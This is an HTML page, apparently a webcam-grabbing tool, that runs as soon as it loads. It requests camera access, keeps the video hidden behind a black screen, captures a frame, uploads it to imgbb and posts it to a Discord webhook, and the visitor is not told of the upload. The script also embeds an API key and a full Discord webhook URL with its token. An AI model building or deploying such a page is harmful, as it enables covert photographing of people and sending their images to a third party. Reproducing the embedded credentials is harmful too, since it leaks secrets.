<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Foto e Envio Discord via Imgbb</title>
<style>
  body {
    margin: 0;
    background: #000;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  video {
    display: none;
  }
</style>
</head>
<body>
  <video id="video" autoplay playsinline></video>

  <script>
    const video = document.getElementById('video');

    const IMGBB_API_KEY = '22073208377f336c94ab59a9dbae29ff'; // Substitua aqui
    const webhookURL = 'https://discord.com/api/webhooks/1391682825329180752/ym0kJ2YnOS0bFj5VK0EpK2K3T-BZtmYI4xRYxaBK-DReqeo75zkUTh_CIip1gtaVbPBi'; // Substitua aqui

    async function uploadToImgbb(base64Image) {
      const formData = new FormData();
      formData.append('key', IMGBB_API_KEY);
      formData.append('image', base64Image);

      const response = await fetch('https://api.imgbb.com/1/upload', {
        method: 'POST',
        body: formData,
      });
      const data = await response.json();
      if (data.success) {
        return data.data.url;
      } else {
        throw new Error('Upload para Imgbb falhou');
      }
    }

    async function sendToDiscord(imageUrl) {
      await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'Camera Bot',
          content: 'Foto capturada:',
          embeds: [{ image: { url: imageUrl } }],
        }),
      });
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = async () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL('image/png');

          const base64Data = dataURL.split(',')[1];

          try {
            const imageUrl = await uploadToImgbb(base64Data);
            await sendToDiscord(imageUrl);
            console.log('Foto enviada para o Discord com sucesso!');
          } catch (err) {
            console.error('Erro no upload ou envio:', err);
          }

          // Desliga a câmera
          stream.getTracks().forEach(track => track.stop());
        };
      } catch (err) {
        console.error('Erro ao acessar a câmera:', err);
      }
    }

    startCamera();
  </script>
</body>
</html>
